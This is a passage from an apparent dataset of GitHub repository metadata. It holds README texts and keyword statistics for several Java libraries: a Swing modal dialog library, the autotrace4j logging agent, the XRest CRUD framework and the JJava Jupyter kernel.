",4,0,2,mit,15.0,"['swing', 'modal', 'dialog', 'java', 'swing', 'library', 'build', 'flatlaf', 'look', 'feel', 'desktop', 'application', 'library', 'include', 'custom', 'component', 'support', 'animation', 'x', 'modal', 'dialog', 'x', 'drawer', 'x', 'toast', 'notification', 'installation', 'add', 'dependency', 'snapshot', 'get', 'latest', 'update', 'release', 'use', 'snapshot', 'version', 'sonatype', 'os', 'snapshot', 'add', 'snapshot', 'version', 'demo', 'get', 'jar', 'file', 'document', 'yet', 'library', 'resources', 'flatlaf', 'flatlaf', 'library', 'modern', 'ui', 'design', 'theme', 'miglayout', 'miglayout', 'library', 'flexible', 'layout', 'management']","['library', 'snapshot', 'flatlaf', 'x', 'swing']",0,0,0,"['swing', 'modal', 'dialog', 'installation', 'snapshot', 'demo', 'document', 'library', 'resource']",6,"['swing', 'modal', 'dialog', 'installation', 'snapshot']",3,0.0,3.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,2.0,1.0,1676,37.333333333333336,5.513392857142857,"['![Maven Central -> https://img.shields.io/maven-central/v/io.github.dj-raven/modal-dialog?label=Maven%20Central', 'Sonatype OSS Snapshots -> https://s01.oss.sonatype.org/content/repositories/snapshots/io/github/dj-raven/modal-dialog/', 'latest-releases -> https://github.com/DJ-Raven/swing-modal-dialog/releases/latest', 'FlatLaf -> https://github.com/JFormDesigner/FlatLaf', 'MigLayout -> https://github.com/mikaelgrev/miglayout', 'x', 'x', 'x']",8
artlibs/autotrace4j,main,"## Auto Trace for Java
[![Run Tests](https://github.com/artlibs/autotrace4j/actions/workflows/testing.yml/badge.svg)](https://github.com/artlibs/autotrace4j/actions/workflows/testing.yml) [![Maven Central](https://maven-badges.herokuapp.com/maven-central/io.github.artlibs/autotrace4j/badge.svg)](https://maven-badges.herokuapp.com/maven-central/io.github.artlibs/autotrace4j/)  [![Release](https://img.shields.io/github/release/artlibs/autotrace4j.svg?style=flat-square)](https://github.com/artlibs/autotrace4j/releases)  [![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg?style=flat)](https://www.apache.org/licenses/LICENSE-2.0)

​	`autotrace4j`是一个基于ByteBuddy编写的轻量级日志跟踪工具，其基本逻辑是在各个上下文当中通过代码增强关键节点来传递`trace id`，最后在日志输出时注入到输出结果当中，以实现日志的跟踪串联。

​	我们借鉴了SkyWalking的实现原理，使用ByteBuddy在各个上下文环节进行关键点增强来传递Trace ID。

#### 易使用

​	基于Agent的方式来使用该工具，对业务代码无侵入。

#### 轻量级

​	只依赖ByteBuddy，且增加的增强代码只是往Thread Local当中写入字符串或读出字符串，没有做额外事项，不会增加性能开销。

## Startup

​	`autotrace4j`的使用非常简单，只需从[release](https://github.com/artlibs/autotrace4j/releases)中下载最新的agent jar包，在启动脚本中以agent方式运行：

```shell
$ java -javaagent=/dir/to/autotrace4j.jar=com.your-domain.biz1.pkg1,com.your-domain.biz2.pkg2 -jar YourJar.jar  # 省略其他无关参数
```

#### 关于`org.slf4j.MDC`

可通过slf4j的MDC获取当前上下文的TraceID：

-   当通过 `MDC.get(""X-Ato-Span-Id"")`时返回当前上下文的 `SpanId`
-   当通过 `MDC.get(""X-Ato-P-Span-Id"")`时返回当前上下文的 `ParentSpanId`
-   当通过 `MDC.get(""X-Ato-Trace-Id"")`时返回当前上下文的 `TraceId`

## Supported Context

### 1、Thread

​	针对Thread进行了增强，在创建线程时支持自动Trace跟踪:

-   `java.lang.Thread`

### 2、Thread Pool

​	基于如下包作为基础的线程池均支持自动Trace跟踪:

-   `java.util.concurrent.ThreadPoolExecutor`
-   `java.util.concurrent.ForkJoinPool`
-   `java.util.concurrent.ScheduledThreadPoolExecutor`

### 3、Http Client

​	基于如下几个Client的HTTP请求客户端在发送请求时都会自动将当前上下文的TraceId设置到请求头：

-   OkHttp3：`com.squareup.okhttp3:okhttp`
-   JDK Http Client：`jdk:sun.net.www.http.HttpClient`
-   ApacheHttpClient：`org.apache.httpcomponents:httpclient`

### 4、Http Servlet

​	我们支持了HTTP Filter和HTTP Servlet来从请求头当中接收TraceId并设置到当前上下文：

-   `javax.servlet.Filter`
-   `javax.servlet.http.HttpServlet`

### 5、MessageQunue

​	目前支持阿里云ONS和RocketMQ在生产和消费时带上TraceId：

-   RocektMQ：`Producer` & `Consumer`
-   Aliyun ONS：`Producer` & `Consumer`
-   Kafka：comming soon....

### 6、Scheduled Task

​	已支持XXL Job和Spring的Scheduled定时任务在产生时生成TraceId：

-   XxlJob Handler：`com.handler.com.xxl.job.core.IJobHandler`
- Spring Schedule Task：`org.springframework.scheduling.annotation.Scheduled`
- PowerJob Processor：`tech.powerjob.worker.core.processor.sdk.BasicProcessor`

### 7、Logging

​	目前支持在logback中输出日志时注入trace id进行输出：

-   logback：`ch.qos.logback:logback-core`

## Contribute

欢迎贡献你的代码，一起完善`autotrace4j`库！
",2,0,1,apache-2.0,13.0,"['auto', 'trace', 'java', 'startup', 'release', 'supported', 'context', 'pool', 'client', 'jdk', 'http', 'servlet', 'aliyun', 'soon', 'task', 'xxljob', 'spring', 'schedule', 'powerjob', 'contribute']","['auto', 'trace', 'java', 'startup', 'release']",0,0,0,"['auto', 'trace', 'java', 'startup', 'support', 'context', 'pool', 'client', 'servlet', 'task', 'contribute']",15,"['auto', 'trace', 'java', 'startup', 'support']",1,18.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,2709,60.6,6.848184818481848,"['![Run Tests -> https://github.com/artlibs/autotrace4j/actions/workflows/testing.yml/badge.svg', '![Maven Central -> https://maven-badges.herokuapp.com/maven-central/io.github.artlibs/autotrace4j/badge.svg', '![Release -> https://img.shields.io/github/release/artlibs/autotrace4j.svg?style=flat-square', '![License: Apache 2.0 -> https://img.shields.io/badge/license-Apache%202.0-blue.svg?style=flat', 'release -> https://github.com/artlibs/autotrace4j/releases']",5
sattinos/xrest,master,"# XRest
A REST accelerator library. It allows for creating CRUD Controller and express conditions in JSON notation

# Why XRest ? Another CRUD Controller ?
The available solutions on the net doesn't offer a powerful expressive way to declare the conditions. <br/>
A truly CRUD Controller, should offer:<br/>
    1. a generic based version that does the heavy workload.<br/>
    2. a fully customizable solution based on business requirements.<br/>
    3. a robust expressive way of WHERE conditions.<br/>
    4. isolate system entities from the application layer by using DTOs (input/output) for the API.

By using XRest, you will offer your project two benefits:
1. a fast way to make CRUD controller for entities. [read more](#useLibrary)
   - **/getOne**  ( condition can be passed ) <br/>
   - **/getMany** ( condition can be passed ) <br/>
   - **/count**  ( condition can be passed )<br/>
   - **/createOne** <br/>
   - **/createMany** <br/>
   - **/updateOne** <br/>
   - **/updateMany** <br/>
   - **/deleteOne** <br/>
   - **/deleteMany** ( condition should be passed ) <br/>
2. support CRUD API set with JSON where condition. [read more](#expressing-where-condition)

### productivity note:
You can utilize ([xrest cli](https://github.com/sattinos/xrest.cli)) to scaffold your necessary code. 


# Prerequisites
1. Java 17 or higher ([Lebrica JDK](https://bell-sw.com/pages/downloads/#jdk-17-lts) is recommended here)
2. [Maven](https://maven.apache.org/download.cgi) 3.9.2 or higher
3. [Spring Boot](https://spring.io/projects/spring-boot) 

# Supported Database
Principally, XRest is supposed to work on any Sql-based database (PostgreSQL, MySql or Microsoft Sql Server). 

# How to start
1. In your Spring Boot project, add the following to the POM file:
```xml
<dependency>
    <groupId>io.github.sattinos</groupId>
    <artifactId>xrest</artifactId>
    <version>1.0.19</version>
    <exclusions>
        <!-- Exclude spring-boot-starter-data-jpa to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </exclusion>
        <!-- Exclude spring-boot-starter-web to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```

2. make sure you add this configuration to tell Spring to scan for XRest components:

```java
@Configuration
@ComponentScan(basePackages = ""org.malsati.xrest"")
public class ApplicationConfig {
}
```

## <a id=""howtouse""></a> How to use this library ? 
1) Design your entity [read more](#step01)
2) Design CRUD endpoints DTOs [read more](#step02)
3) Write down your entity mapper interface [read more](#step03)
4) Design your repository [read more](#step04)
5) Write down you service class [read more](#step05)
6) Write your CRUD Controller [read more](#step06)


## <a id=""step01""></a> 1) Design your entity  
When designing your entity, you have two options:

1. Design your entity freely without any utilization of XRest base classes or interfaces. [read more](#defreely)
2. Make use of the list of interfaces and base entities offered by XRest. [read more](#dexrest)

### <a id=""defreely""></a> Option1: Freely design your own entitities:
You can design your own entity without any constraints.

for example:

```java
@NoArgsConstructor
@Data
@Entity
@Table(name = ""Author"")
public class Author {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    protected Long id;

    @Column(name = ""full_name"", unique = true)
    private String fullName;

    @Column(name = ""birth_date"")
    private LocalDate birthDate;
}
```
Notice that here no XRest base entities is used.

[back to main steps](#howtouse)

### <a id=""dexrest""></a> Option2: Interfaces and base entities offered by XRest:
When coming to business requirements, `Audit Info` are of three types:
1. Creation info:
    - who created the entity
    - when it has been created
2. Update info:
    - who updated the entity
    - when it has been updated
3. Delete info: (soft delete only)
    - who deleted the entity
    - when it has been deleted

`XRest` offers a list of base classes to cover this:<br/><br/>
<blockquote style=""background-color:rgb(252, 252, 252); "">

`CreateEntity`: for entities that needs only creation info of the entity.

<details>
    <summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""City"")
public class City extends CreateEntity {
    private String name;
    private String isoCode;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(250, 250, 250); "">

`UpdateEntity`: for entities that needs only update info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""MessageItem"")
public class MessageItem extends UpdateEntity {
    private String contents;
    private String senderName;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(252, 252, 252); "">

`DeleteEntity`: for entities that needs only delete info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Color"")
public class Color extends DeleteEntity {
    private String rgbValue;
}
```
</blockquote>
</details>
</blockquote>
<br/>
<blockquote style=""background-color:rgb(250, 250, 250); "">

`AuditEntity`: for entities that needs creation info as well as update info.

<details>
<summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Report"")
public class Report extends AuditEntity {
    private String title;
    private String content;
}
```
</blockquote>
</details>
</blockquote>
<br/>
<blockquote style=""background-color:rgb(252, 252, 252); "">

`FullAuditEntity`: for entities that needs all the audit information (creation, update and delete).


<details>
<summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Contract"")
public class Contract extends FullAuditEntity {
    private String startDate;
    private String endDate;
}
```
</blockquote>
</details>
</blockquote>

[back to main steps](#howtouse)


Note: There are a list of Audit interfaces that are considered the contracts of auditing. They might be useful in some situations:
`CreationInfo`
`UpdateInfo`
`DeletionInfo`
`IdentityInfo`

#### Soft Delete Note:
When you want your entity to be soft-deleted, make sure you implement the interface: `DeletionInfo`.

CRUD operations will support `Soft Delete` automatically when you implement this interface.

If your entity doesn't implement this interface, `Hard Delete` will be chosen by XRest.

## <a id=""step02""></a> 2) Design CRUD endpoints DTOs 

#### CreateOne Endpoint (CreateOneInputDto, CreateOneOutputDto)

```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorInputDto {
    private String fullName;
    private LocalDate birthDate;
    private Collection<Long> bookIds;
}
```
```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorOutputDto extends CreateOneAuthorInputDto {
    private Long id;

    public CreateOneAuthorOutputDto(Long id, String fullName, LocalDate birthDate, Collection<Long> bookIds) {
        super(fullName, birthDate, bookIds);
        this.id = id;
    }
}
```

#### UpdateOne Endpoint (UpdateOneInputDto)
```java

public class UpdateOneAuthorInputDto extends CreateOneAuthorOutputDto implements IdentityInfo<Long> {  
}
```

### note:
When writing your `UpdateOneInputDto` you need to implement the interface `IdentityInfo` so that XRest will know how to retrieve the ID of the entity.
The ID of the entity is used by XRest to do basic validation before doing the actual update of the entity.
This validation is common to all entities though.


#### GetOne Endpoint (GetOneInputDto)
```java
public class GetOneAuthorOutputDto extends CreateOneAuthorOutputDto {
}
```

#### DeleteOne Endpoint (DeleteOneOutputDto)
```java
public class DeleteOneAuthorOutputDto extends UpdateOneAuthorInputDto {
}
```

## <a id=""step03""></a> 3) Write down your entity mapper interface
It should inherit from IMapper

```java
@Mapper(componentModel = ""spring"", nullValuePropertyMappingStrategy = NullValuePropertyMappingStrategy.IGNORE)
public interface AuthorMapper extends IMapper<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {

    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author createOneInputDtoToEntity(CreateOneAuthorInputDto createOneAuthorInputDto);
    
    @Override
    @Named(""createOne"")
    @Mapping(source = ""books"", target = ""bookIds"")
    CreateOneAuthorOutputDto entityToCreateOneOutputDto(Author entity);
    
    @Override
    List<Author> createManyInputDtoToEntities(Iterable<CreateOneAuthorInputDto> createManyInputDto);
    
    @Override
    @IterableMapping(qualifiedByName = ""createOne"")
    List<CreateOneAuthorOutputDto> entitiesToCreateManyOutputDto(List<Author> entities);
    
    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author updateOneInputDtoToEntity(UpdateOneAuthorInputDto updateOneAuthorInputDto);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    DeleteOneAuthorOutputDto entityToDeleteOneOutputDto(Author entity);
    
    @Override
    List<DeleteOneAuthorOutputDto> entitiesToDeleteManyOutputDto(List<Author> entity);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    GetOneAuthorOutputDto entityToGetOneoutputDto(Author entity);

    default List<Book> mapBookIdsToBooks(Collection<Long> bookIds) {
        var books = new ArrayList<Book>(bookIds.size());
        for (Long id: bookIds) {
            books.add(new Book(id));
        }
        return books;
    }

    default List<Long> mapBooksToBookIds(Collection<Book> books) {
        var bookIds = new ArrayList<Long>(books.size());
        for (var book: books) {
            bookIds.add(book.getId());
        }
        return bookIds;
    }
}
```

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/mapper/AuthorMapper.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/mapper/BookMapper.java)

[back to main steps](#howtouse)

## <a id=""step04""></a> 4) Design your repository
Make sure you inherit from `JpaRepository` as well as `JpaSpecificationExecutor` :
```java
public interface AuthorRepository extends JpaRepository<Author, Long>, JpaSpecificationExecutor<Author> {    
}
```

[back to main steps](#howtouse)

## <a id=""step05""></a> 5) Write down your service class:
1. It should extend CrudServiceORM
2. In its constructor, it should inject the entity
   repository and the mapper you've created in previous steps.
3. Implement the validation methods `validateCreateOneInput` and `validateUpdateOneInput` if needed (optional)
4. Implement the hooks `onPreCreateOne`, `onPreUpdateOne` and `onPreDeleteOne` if needed (optional)

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/service/AuthorsService.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/service/BookService.java)


```java
@Service
public class AuthorsService extends CrudServiceORM<
        Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsService(
            AuthorRepository authorRepository,
            AuthorMapper mapper) {
        super(authorRepository, mapper);
    }   
}
```
[back to main steps](#howtouse)

## <a id=""step06""></a> 6) Write your CRUD Controller:  
1. It should inherit from CRUDController<br/>
2. It should pass the service class you've created in previous step

```java
@RequestMapping(""/app/author"")
@RestController
public class AuthorsController extends CrudController<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsController(AuthorsService authorsService) {
        super(authorsService);
    }
}
```

[back to main steps](#howtouse)

# How to test 
```bash
mvn test
```

while testing the project, I recommend you test using the test runner of IntelliJ Idea Community Edition.
Each test case will output explanatory messages. Run the tests from the Test Suite [ContollersTestsSuite](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java) 

### About testing project:
It is a Spring Boot web app, that starts the journey with you:
1. How to Design an entity in both ways (utilize XRest Base classes, and freely design your entity).
2. Shows how to design DTO classes.
3. Shows how to write mapper.
4. Shows how to write your repository classes.
5. Shows how to write your custom service classes and write custom business validation rules as well as create/update/delete hooks.
6. Shows you the power of `JSON Condition` and how to pass it to the API.
7. Shows how to write your controller classes.
8. Shows how to form `JSON Condition` in case of relation (ONE-TO-ONE, ONE-TO-MANY, MANY-TO-MANY). 

The test project test cases:
1. AuthorControllerTest it has 16 test cases. It shows how to utilize XRest base entities.
2. BookControllerTest it has 13 test cases. It show how your freely designed entities fit into XRest.
3. AuthorAndBookControllerTest it has 3 test cases mainly for how to deal with relation.

If you have further test cases that needs to be addressed, just drop me an email or open an issue.

[The test project source code](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java)


## Expressing Where Condition
The Where condition is in JSON notation. It allows you to express a business filter in JSON format.
Whether you need this condition in the API, Service Layer or Infrastructure Layer.

The Structure:
    It can have one of these two forms:

    1. LHS/RHS format:
    {
        ""op"": ...,
        ""lhs"": ...,
        ""rhs"": ...        
    }

    This is used with Binary operators, where:
    op: operator type ( <, =, <=, >, >=, !=, like )
    lhs: left hand side, should be the entity field name.
    rhs: right hand side, should be the value

    example1:
    {
        ""op"": ""like"",
        ""lhs"": ""title"",
        ""rhs"": ""%Harry Potter%""
    }
    => all entities which have a title similar to the form: %Harry Potter%

    example2:
    {
        ""op"": "">"",
        ""lhs"": ""age"",
        ""rhs"": 18
    }
    => all entities which have an age higher than 18

    If the type of the rhs is not scalar, you need to provide a hint what is it through the ""type"" key.
    for example:

    example3:
    {
        ""op"": "">"",
        ""lhs"": ""publishDate"",
        ""rhs"": ""2009-01-01"",
        ""type"": ""Date""
    }
    => all entities whose publishDate is after 2009-01-01

    2. RANGE format:
    This is used with Ternary operators, where:
    op: operator type ( between )
    lhs: left hand side, should be the entity field name.
    range1: the start of the range
    range2: the end of the range
    
    example4:
    {
        ""op"": ""between"",
        ""lhs"": ""deathDate"",
        ""range1"": ""1999-06-01"",
        ""range2"": ""2003-12-01"",
        ""type"": ""Date""
    }
    => all entities whose deathDate is in the range inclusive [1999-06-01 , 2003-12-01]

    example5:
    {
        ""op"": ""between"",
        ""lhs"": ""age"",
        ""range1"": 18,
        ""range2"": 28
    }
    => all entities whose age is in the range inclusive [18, 28]

    example6:
    {
        ""op"": ""&&"",
        ""lhs"": {
            ""op"": ""between"",
            ""lhs"": ""publishDate"",
            ""range1"": ""1999-06-01"",
            ""range2"": ""2003-12-01"",
            ""type"": ""Date""
        },
        ""rhs"": {
            ""op"": ""||"",
            ""lhs"": {
                ""op"": ""like"",
                ""lhs"": ""name"",
                ""rhs"": ""% of %""
            },
            ""rhs"": {
                ""op"": "">"",
                ""lhs"": ""noPages"",
                ""rhs"": 800
            }
        }
    }
    => all entities that:
            has been published in the range inclusive [1999-06-01 , 2003-12-01]
            and 
                either 
                       its name is similar to the token "" of "" 
                    or its number of pages is more than 800

    example7
    {
        ""op"": ""="",
        ""lhs"": ""books.title"",
        ""rhs"": ""Artificial Intelligence""
    }
    
    => All the authors who authored the book of title: 'Artificial Intelligence'
    Notice that the Author has a relation Many To Many to Book entity 
    and there is a list inside the Author called books
    This will allow you to query for nested entities inside the root entity
    The nesting level is infinite as long as there is a relation.


![Class Diagram](assets/classDiagram.png)

### Roadmap
JSON schema validation (todo)
    Handle Invalid Input:
        wrong key

Update Where

Transitive Dependency

Post Hooks
Missing Hooks

Support WildCard


CrudService should be protected
",0,0,4,mit,3.0,"['xrest', 'rest', 'accelerator', 'library', 'allows', 'creating', 'crud', 'controller', 'express', 'condition', 'json', 'notation', 'xrest', 'another', 'crud', 'controller', 'available', 'solution', 'net', 'offer', 'powerful', 'expressive', 'way', 'declare', 'condition', 'truly', 'crud', 'controller', 'offer', 'generic', 'based', 'version', 'heavy', 'workload', 'fully', 'customizable', 'solution', 'based', 'business', 'requirement', 'robust', 'expressive', 'way', 'condition', 'isolate', 'system', 'entity', 'application', 'layer', 'using', 'dtos', 'api', 'using', 'xrest', 'offer', 'project', 'two', 'benefit', 'fast', 'way', 'make', 'crud', 'controller', 'entity', 'read', 'condition', 'passed', 'condition', 'passed', 'condition', 'passed', 'condition', 'passed', 'support', 'crud', 'api', 'set', 'json', 'condition', 'read', 'productivity', 'note', 'utilize', 'xrest', 'cli', 'scaffold', 'necessary', 'code', 'prerequisite', 'java', 'higher', 'lebrica', 'jdk', 'recommended', 'maven', 'higher', 'spring', 'boot', 'supported', 'database', 'principally', 'xrest', 'supposed', 'work', 'database', 'postgresql', 'mysql', 'microsoft', 'sql', 'server', 'start', 'spring', 'boot', 'project', 'add', 'following', 'pom', 'file', 'make', 'sure', 'add', 'configuration', 'tell', 'spring', 'scan', 'xrest', 'component', 'use', 'library', 'design', 'entity', 'read', 'design', 'crud', 'endpoint', 'dtos', 'read', 'write', 'entity', 'mapper', 'interface', 'read', 'design', 'repository', 'read', 'write', 'service', 'class', 'read', 'write', 'crud', 'controller', 'read', 'design', 'entity', 'designing', 'entity', 'two', 'option', 'design', 'entity', 'freely', 'without', 'utilization', 'xrest', 'base', 'class', 'interface', 'read', 'make', 'use', 'list', 'interface', 'base', 'entity', 'offered', 'xrest', 'read', 'freely', 'design', 'entitities', 'design', 'entity', 'without', 'constraint', 'example', 'notice', 'xrest', 'base', 'entity', 'used', 'back', 'main', 'step', 'interface', 'base', 'entity', 'offered', 'xrest', 'coming', 'business', 'requirement', 'three', 'type', 'creation', 'info', 'created', 'entity', 'created', 'update', 'info', 'updated', 'entity', 'updated', 'delete', 'info', 'soft', 'delete', 'deleted', 'entity', 'deleted', 'offer', 'list', 'base', 'class', 'cover', 'entity', 'need', 'creation', 'info', 'entity', 'entity', 'need', 'update', 'info', 'entity', 'entity', 'need', 'delete', 'info', 'entity', 'entity', 'need', 'creation', 'info', 'well', 'update', 'info', 'entity', 'need', 'audit', 'information', 'creation', 'update', 'delete', 'back', 'main', 'step', 'note', 'list', 'audit', 'interface', 'considered', 'contract', 'auditing', 'might', 'useful', 'situation', 'soft', 'delete', 'note', 'want', 'entity', 'make', 'sure', 'implement', 'interface', 'crud', 'operation', 'support', 'automatically', 'implement', 'interface', 'entity', 'implement', 'interface', 'chosen', 'xrest', 'design', 'crud', 'endpoint', 'dtos', 'createone', 'endpoint', 'createoneinputdto', 'createoneoutputdto', 'updateone', 'endpoint', 'updateoneinputdto', 'note', 'writing', 'need', 'implement', 'interface', 'xrest', 'know', 'retrieve', 'id', 'entity', 'id', 'entity', 'used', 'xrest', 'basic', 'validation', 'actual', 'update', 'entity', 'validation', 'common', 'entity', 'though', 'getone', 'endpoint', 'getoneinputdto', 'deleteone', 'endpoint', 'deleteoneoutputdto', 'write', 'entity', 'mapper', 'interface', 'inherit', 'imapper', 'show', 'first', 'case', 'show', 'second', 'case', 'back', 'main', 'step', 'design', 'repository', 'make', 'sure', 'inherit', 'well', 'back', 'main', 'step', 'write', 'service', 'class', 'extend', 'crudserviceorm', 'constructor', 'inject', 'entity', 'repository', 'mapper', 'created', 'previous', 'step', 'implement', 'validation', 'method', 'needed', 'optional', 'implement', 'hook', 'needed', 'optional', 'show', 'first', 'case', 'show', 'second', 'case', 'back', 'main', 'step', 'write', 'crud', 'controller', 'inherit', 'crudcontroller', 'pas', 'service', 'class', 'created', 'previous', 'step', 'back', 'main', 'step', 'test', 'testing', 'project', 'recommend', 'test', 'using', 'test', 'runner', 'intellij', 'idea', 'community', 'edition', 'test', 'case', 'output', 'explanatory', 'message', 'run', 'test', 'test', 'suite', 'contollerstestssuite', 'testing', 'project', 'spring', 'boot', 'web', 'app', 'start', 'journey', 'design', 'entity', 'way', 'utilize', 'xrest', 'base', 'class', 'freely', 'design', 'entity', 'show', 'design', 'dto', 'class', 'show', 'write', 'mapper', 'show', 'write', 'repository', 'class', 'show', 'write', 'custom', 'service', 'class', 'write', 'custom', 'business', 'validation', 'rule', 'well', 'hook', 'show', 'power', 'pas', 'api', 'show', 'write', 'controller', 'class', 'show', 'form', 'case', 'relation', 'test', 'project', 'test', 'case', 'authorcontrollertest', 'test', 'case', 'show', 'utilize', 'xrest', 'base', 'entity', 'bookcontrollertest', 'test', 'case', 'show', 'freely', 'designed', 'entity', 'fit', 'xrest', 'authorandbookcontrollertest', 'test', 'case', 'mainly', 'deal', 'relation', 'test', 'case', 'need', 'addressed', 'drop', 'email', 'open', 'issue', 'test', 'project', 'source', 'code', 'expressing', 'condition', 'condition', 'json', 'notation', 'allows', 'express', 'business', 'filter', 'json', 'format', 'whether', 'need', 'condition', 'api', 'service', 'layer', 'infrastructure', 'layer', 'structure', 'one', 'two', 'form', 'roadmap', 'json', 'schema', 'validation', 'todo', 'handle', 'invalid', 'input', 'wrong', 'key', 'update', 'transitive', 'dependency', 'post', 'hook', 'missing', 'hook', 'support', 'wildcard', 'crudservice', 'protected']","['entity', 'xrest', 'show', 'test', 'design']",14,0,0,"['xrest', 'why', 'xrest', 'another', 'crud', 'controller', 'productivity', 'note', 'prerequisite', 'support', 'database', 'how', 'start', 'a', 'howtouse', 'how', 'use', 'library', 'a', 'design', 'entity', 'a', 'defreely', 'freely', 'design', 'entitities', 'a', 'dexrest', 'interface', 'base', 'entity', 'offer', 'xrest', 'soft', 'delete', 'note', 'a', 'design', 'crud', 'endpoint', 'dtos', 'createone', 'endpoint', 'createoneinputdto', 'createoneoutputdto', 'updateone', 'endpoint', 'updateoneinputdto', 'note', 'getone', 'endpoint', 'getoneinputdto', 'deleteone', 'endpoint', 'deleteoneoutputdto', 'a', 'write', 'entity', 'mapper', 'interface', 'a', 'design', 'repository', 'a', 'write', 'service', 'class', 'a', 'write', 'crud', 'controller', 'how', 'test', 'about', 'test', 'project', 'express', 'where', 'condition', 'roadmap']",25,"['a', 'endpoint', 'design', 'xrest', 'crud']",18,40.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,17562,26.4625,5.682097307510628,"['xrest cli -> https://github.com/sattinos/xrest.cli', 'Lebrica JDK -> https://bell-sw.com/pages/downloads/#jdk-17-lts', 'Maven -> https://maven.apache.org/download.cgi', 'Spring Boot -> https://spring.io/projects/spring-boot']",4
dflib/jjava,main,"# JJava

JJava is a Java kernel for [Jupyter](http://jupyter.org/) maintained by the [DFLib.org](https://dflib.org) community. 
The kernel executes code via the JShell tool. Some of the additional commands are supported via a syntax similar to IPython magics. 

_JJava is an evolution of the earlier [IJava kernel](https://github.com/SpencerPark/IJava), that is no longer maintained by its authors._

## Requirements

1.  Java 11 or newer
2.  Python and a Jupyter-like environment to use the kernel in.

## Installation

_More detailed instructions are available in the [documentation](https://dflib.org/jjava/docs/1.x/#_installation)._

1.  Download the latest release from the [releases tab](https://github.com/dflib/jjava/releases).
2.  Unzip it into a temporary location.
3.  Run the `jupyter kernelspec install path/to/downloaded/folder --user --name=java`

## Project Links

* [Website](https://dflib.org/)
* [Documentation](https://dflib.org/jjava/docs/1.x/)
* [Discussions and Support Forum](https://github.com/dflib/jjava/discussions)
* [Bug reports and feature requests](https://github.com/dflib/jjava/issues)

",4,7,4,mit,14.0,"['jjava', 'jjava', 'java', 'kernel', 'jupyter', 'maintained', 'community', 'kernel', 'executes', 'code', 'via', 'jshell', 'tool', 'additional', 'command', 'supported', 'via', 'syntax', 'similar', 'ipython', 'magic', 'jjava', 'evolution', 'earlier', 'ijava', 'kernel', 'longer', 'maintained', 'author', 'requirements', 'java', 'newer', 'python', 'environment', 'use', 'kernel', 'installation', 'detailed', 'instruction', 'available', 'documentation', 'download', 'latest', 'release', 'release', 'tab', 'unzip', 'temporary', 'location', 'run', 'project', 'link', 'website', 'documentation', 'discussion', 'support', 'forum', 'bug', 'report', 'feature', 'request']","['kernel', 'jjava', 'java', 'maintained', 'via']",0,0,0,"['jjava', 'requirement', 'installation', 'project', 'link']",4,"['jjava', 'requirement', 'installation', 'project', 